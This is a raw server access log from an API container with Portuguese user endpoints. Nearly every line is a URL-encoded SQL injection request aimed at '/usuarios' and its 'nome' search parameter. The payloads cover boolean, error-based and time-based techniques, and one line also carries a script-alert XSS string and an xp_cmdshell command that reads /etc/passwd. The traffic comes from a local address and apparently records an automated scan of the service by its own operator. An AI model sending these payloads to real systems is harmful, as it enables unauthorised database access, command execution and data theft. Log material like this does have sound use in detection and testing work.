api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F9825%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2865%29%7C%7CCHR%2869%29%7C%7CCHR%2881%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9825%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2865%29%7C%7CCHR%2869%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27RFtZ%27%3D%27RFtZ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F9825%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2865%29%7C%7CCHR%2869%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Vooc%27%3D%27Vooc HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F9825%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2865%29%7C%7CCHR%2869%29%7C%7CCHR%2881%29%2C5%29--%2F%2A%2A%2FWrfu HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FQdvM HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FVuVB HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FsJwf HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2Fxano HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FHCoP HTTP/1.1
api-1  | 172.18.0.1 - POST /usuarios HTTP/1.1
api-1  | 172.18.0.1 - POST /usuarios HTTP/1.1
api-1  | 172.18.0.1 - POST /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/1 HTTP/1.1
api-1  | 172.18.0.1 - PUT /usuarios/1 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste&DzgM=9190%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=4470 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste.%22.%29%28%28%2C%27%2C. HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27bCAaaH%3C%27%22%3EhMWYPo HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7104%3D4328%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Srbo%27%3D%27Srbo HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2446%3D2446%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27LJtS%27%3D%27LJtS HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7220%3D7133%2F%2A%2A%2FAND%2F%2A%2A%2F%27hnlp%27%3D%27hnlp HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2446%3D2446%2F%2A%2A%2FAND%2F%2A%2A%2F%27uAor%27%3D%27uAor HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2668%3D5081%2F%2A%2A%2FAND%2F%2A%2A%2F%286065%3D6065 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2446%3D2446%2F%2A%2A%2FAND%2F%2A%2A%2F%286900%3D6900 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9150%3D5381 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2446%3D2446 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4591%3D3348--%2F%2A%2A%2FANel HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2446%3D2446--%2F%2A%2A%2FUFOn HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284568%3D4657%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4657%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6802%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288306%3D8306%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6050%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3701%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283423%2CCONCAT%280x5c%2C0x716a717071%2C%28SELECT%2F%2A%2A%2F%28ELT%283423%3D3423%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27MhYb%27%3D%27MhYb HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283423%2CCONCAT%280x5c%2C0x716a717071%2C%28SELECT%2F%2A%2A%2F%28ELT%283423%3D3423%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vWkJ%27%3D%27vWkJ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283423%2CCONCAT%280x5c%2C0x716a717071%2C%28SELECT%2F%2A%2A%2F%28ELT%283423%3D3423%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287974%3D7974 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283423%2CCONCAT%280x5c%2C0x716a717071%2C%28SELECT%2F%2A%2A%2F%28ELT%283423%3D3423%2C1%29%29%29%2C0x716a717871%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283423%2CCONCAT%280x5c%2C0x716a717071%2C%28SELECT%2F%2A%2A%2F%28ELT%283423%3D3423%2C1%29%29%29%2C0x716a717871%29%29--%2F%2A%2A%2FmgiP HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4404%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284404%3D4404%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SFTm%27%3D%27SFTm HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4404%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284404%3D4404%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27QuZT%27%3D%27QuZT HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4404%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284404%3D4404%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281029%3D1029 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4404%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284404%3D4404%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4404%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284404%3D4404%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FLqVp HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8181%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288181%3D8181%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SLip%27%3D%27SLip HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8181%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288181%3D8181%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27irIY%27%3D%27irIY HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8181%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288181%3D8181%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288554%3D8554 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8181%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288181%3D8181%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8181%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288181%3D8181%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2Fzrxn HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4482%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284482%3D4482%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27naAm%27%3D%27naAm HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4482%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284482%3D4482%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27RYHG%27%3D%27RYHG HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4482%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284482%3D4482%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282268%3D2268 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4482%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284482%3D4482%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4482%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284482%3D4482%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FWelM HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288190%3D8190%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2887%29%7C%7CCHR%2874%29%7C%7CCHR%2874%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2887%29%7C%7CCHR%2874%29%7C%7CCHR%2874%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2887%29%7C%7CCHR%2874%29%7C%7CCHR%2874%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2887%29%7C%7CCHR%2874%29%7C%7CCHR%2874%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8159%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29vHSd%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27iXfc%27%3D%27iXfc HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8159%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29vHSd%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27pFOA%27%3D%27pFOA HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8159%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29vHSd%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285210%3D5210 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8159%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29vHSd%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8159%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29vHSd%29--%2F%2A%2A%2FTXVH HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7389%3D%28SELECT%2F%2A%2A%2F7389%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27fuEA%27%3D%27fuEA HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7389%3D%28SELECT%2F%2A%2A%2F7389%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27FjFA%27%3D%27FjFA HTTP/1.1
